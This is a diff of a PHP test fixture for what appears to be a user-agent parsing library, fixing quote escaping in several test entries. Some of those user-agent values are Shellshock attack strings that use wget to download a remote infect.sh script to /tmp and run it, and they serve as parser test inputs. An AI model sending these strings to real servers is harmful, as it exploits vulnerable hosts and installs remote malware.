@@ -299,7 +299,7 @@ return [
         ],
     ],
     'test-0011-11' => [
-        'ua'         => '() { :; }; /bin/bash -c \\'wget http://176.126.85.127:8080/megatron -O /dev/null\\'',
+        'ua'         => '() { :; }; /bin/bash -c \'wget http://176.126.85.127:8080/megatron -O /dev/null\'',
         'properties' => [
             'Browser_Name'            => 'Default Browser',
             'Browser_Type'            => 'unknown',
@@ -1973,7 +1973,7 @@ return [
         ],
     ],
     'test-0011-74' => [
-        'ua'         => '() { :; }; /bin/bash -c \\'wget http://94.102.51.124/infect.sh -O /tmp/infect.sh; chmod +x /tmp/infect.sh; /tmp/infect.sh\\'',
+        'ua'         => '() { :; }; /bin/bash -c \'wget http://94.102.51.124/infect.sh -O /tmp/infect.sh; chmod +x /tmp/infect.sh; /tmp/infect.sh\'',
         'properties' => [
             'Browser_Name'            => 'Default Browser',
             'Browser_Type'            => 'unknown',
@@ -2837,7 +2837,7 @@ return [
         ],
     ],
     'test-0011-106' => [
-        'ua'         => '() { :; }; /bin/bash -c \\'echo radioactive.su; wget http://94.102.51.124/infect.sh -O /tmp/infect.sh; chmod +x /tmp/infect.sh; /tmp/infect.sh &\\'',
+        'ua'         => '() { :; }; /bin/bash -c \'echo radioactive.su; wget http://94.102.51.124/infect.sh -O /tmp/infect.sh; chmod +x /tmp/infect.sh; /tmp/infect.sh &\'',
         'properties' => [
             'Browser_Name'            => 'Default Browser',
             'Browser_Type'            => 'unknown',
@@ -18470,7 +18470,7 @@ return [
         ],
     ],
     'test-0011-691' => [
-        'ua'         => '\\'',
+        'ua'         => '\'',
         'properties' => [
             'Browser_Name'            => 'Default Browser',
             'Browser_Type'            => 'unknown',
